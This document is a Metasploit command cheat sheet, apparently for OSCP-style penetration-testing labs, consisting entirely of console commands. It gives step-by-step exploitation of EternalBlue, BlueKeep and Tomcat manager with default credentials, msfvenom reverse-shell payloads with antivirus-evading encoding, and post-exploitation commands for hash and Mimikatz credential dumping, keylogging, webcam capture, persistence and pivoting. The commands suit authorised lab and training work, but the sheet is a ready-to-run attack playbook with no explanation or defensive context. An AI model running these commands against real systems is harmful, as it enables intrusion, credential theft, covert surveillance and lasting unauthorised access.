# Metasploit

```
# Start Metasploit
msfconsole
msfconsole -q
msfconsole -r commands.rc

# Database Setup
msfdb init
msfdb start
db_status

# Workspace Management
workspace
workspace -a oscp
workspace oscp

# Search Modules
search smb
search type:exploit smb
search cve:2021
search apache
search eternalblue

# Use Module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_version

# Show Module Information
info
show options
show payloads
show targets
show advanced

# Set Variables
set RHOSTS 10.10.10.10
set RHOST 10.10.10.10
set LHOST tun0
set LPORT 4444
set TARGET 0
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run Module
run
exploit
exploit -j
run -j

# Background Session
background

# Sessions
sessions
sessions -i 1
sessions -u 1
sessions -k 1
sessions -K

# Meterpreter Basics
sysinfo
getuid
pwd
ls
cd
cat file.txt
download file.txt
upload shell.exe
shell
execute -f cmd.exe
ps
migrate PID
getsystem
hashdump

# Privilege Escalation
getsystem
run post/multi/recon/local_exploit_suggester

# Port Scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.10
set PORTS 1-1000
run

# SMB Enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.10
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.10
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.10.10.10
run

# FTP Enumeration
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 10.10.10.10
run

# SSH Enumeration
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.10.10.10
run

# SNMP Enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 10.10.10.10
run

# HTTP Enumeration
use auxiliary/scanner/http/title
set RHOSTS 10.10.10.10
run

# Vulnerability Scanning
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.10.10.10
run

# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
run

# BlueKeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.10
run

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.10
set HttpUsername tomcat
set HttpPassword tomcat
run

# Web Delivery
use exploit/multi/script/web_delivery
set TARGET 2
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST tun0
run

# Handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run

# Generate Payloads with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f raw > shell.php
msfvenom -p cmd/unix/reverse_bash LHOST=tun0 LPORT=4444 -f raw

# Encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell.exe

# List Payloads
show payloads

# List Exploits
show exploits

# List Auxiliary Modules
show auxiliary

# List Post Modules
show post

# Route Traffic Through Meterpreter
run autoroute -s 10.10.20.0/24

# SOCKS Proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Add Route
route add 10.10.20.0 255.255.255.0 1

# Credential Dumping
use post/windows/gather/hashdump
set SESSION 1
run

# Kiwi/Mimikatz
load kiwi
creds_all

# Screenshot
screenshot

# Webcam
webcam_list
webcam_snap

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Persistence
run persistence -U -i 5 -p 4444 -r tun0

# File Search
search -f *.txt

# Pivoting
portfwd add -l 3389 -p 3389 -r 10.10.20.10

# Check Vulnerability
check

# Save Loot
loot

# Notes
notes

# Hosts
hosts

# Services
services

# Vulns
vulns

# Import Nmap Scan
db_import scan.xml

# Export Data
hosts -o hosts.txt
services -o services.txt

# Resource Script
resource commands.rc

# Logging
spool msf.log
spool off

# Common OSCP Commands
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use exploit/multi/handler
use exploit/windows/smb/ms17_010_eternalblue
sessions -i 1
background
shell
getsystem
hashdump
run post/multi/recon/local_exploit_suggester
autoroute -s 10.10.20.0/24
```
